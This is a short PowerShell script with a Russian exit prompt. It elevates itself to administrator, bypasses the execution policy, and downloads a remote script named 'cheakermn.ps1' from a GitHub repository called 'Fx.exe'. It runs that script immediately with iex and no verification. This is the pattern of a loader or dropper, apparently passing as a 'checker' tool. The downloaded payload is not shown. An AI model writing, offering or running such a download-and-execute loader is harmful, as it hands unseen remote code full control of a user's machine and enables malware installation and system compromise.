$isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")

if (-NOT $isAdmin) {
    $arguments = "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`""
    if ($args.Count -gt 0) {
        $arguments += " " + ($args -join " ")
    }
    Start-Process PowerShell -Verb RunAs -ArgumentList $arguments
    exit
}

Set-ExecutionPolicy Bypass -Scope Process -Force
$script = (iwr 'https://github.com/kilordow/Fx.exe/raw/refs/heads/main/cheakermn.ps1' -UseBasicParsing).Content
iex $script

Read-Host "Нажмите Enter для выхода"
